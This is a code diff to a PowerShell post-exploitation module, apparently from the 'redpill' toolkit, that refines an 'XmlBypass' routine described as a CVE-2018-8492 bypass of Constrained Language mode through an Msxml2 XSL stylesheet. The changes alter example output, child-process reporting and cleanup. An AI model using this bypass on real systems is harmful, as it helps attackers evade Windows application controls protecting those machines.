@@ -61,7 +61,7 @@
    ----------------------------------------
    AffectedOSflavor    : true
    ConstrainedLanguage : enabled
-   ExecuteAppl         : cmd.exe
+   ExecuteAppl         : powershell.exe
    ApplTimeOpen        : 1 seconds
       
    [XML] CVE-2018-8492 bypass!
@@ -70,9 +70,9 @@
    creating Msxml2 COM Object to load xml file!
    trying to execute yUeInzP.xml stylesheet file!
 
-   ScanResults         : XML successfully executed application!
-                       : ProcessName 'cmd' -> ProcessPID '5636'
-                       : C:\Windows\System32\cmd.exe
+   ScanResults         : Id 8560 - XML successfully executed application!
+                       : ChildProcessName 'powershell' -> ChildProcessPID '3896'
+                       : C:\Windows\System32\WindowsPowerShell\v1.0\Powershell.exe
 
 .LINK
    https://github.com/r00t-3xp10it/redpill
@@ -241,15 +241,15 @@ If($Action -ieq "XmlBypass"){
 
 
    Start-Sleep -Seconds 1
-   $RawIds = $CheckApplIdState | Select-Object -Last 1
-   If($CheckApplIdState -ne $null){## Executed application output table!
-      $GetI0Name = (Get-Process -id $CheckApplIdState).ProcessName.ToString()
+   $RawIds = $CheckApplIdState | Where-Object { $_ -ne $IdParent } | Select-Object -Last 1
+   If($CheckApplIdState -ne $null){## Sucessfully Executed application output table!
       $GetI0Path = (Get-Process -id $CheckApplIdState).Path | Select-Object -Last 1
-      Write-Host "`nScanResults          : XML successfully executed application!" -ForegroundColor Green -BackGroundColor Black
-      Write-Host "                     : ProcessName '$GetI0Name' -> ProcessPID '$RawIds'" -ForegroundColor DarkGreen
+      $GetI0Name = (Get-Process -id $CheckApplIdState).ProcessName | Select-Object -Last 1
+      Write-Host "`nScanResults          : Id $IdParent - XML successfully executed application!" -ForegroundColor Green -BackGroundColor Black
+      Write-Host "                     : ChildProcessName '$GetI0Name' -> ChildProcessPID '$RawIds'" -ForegroundColor DarkGreen
       Write-Host "                     : $GetI0Path" -ForegroundColor DarkGreen
    }Else{## NOt executed application output teble!
-      Write-Host "`nScanResults          : XML failed to execute application!" -ForegroundColor Red -BackgroundColor Black
+      Write-Host "`nScanResults          : Id $IdParent - XML failed to execute application!" -ForegroundColor Red -BackgroundColor Black
    }
 
 
@@ -259,7 +259,7 @@ If($Action -ieq "XmlBypass"){
       If($CheckApplIdState -ne $null){
 
          ForEach($Token in $CheckApplIdState){## Loop trougth all Id's
-            If(-not($Token -eq $IdParent)){## Stop Process by is PID
+            If($Token -ne $IdParent){## Stop Process by is PID
                Stop-Process -Id $Token -Force -EA SilentlyContinue
             }
          }
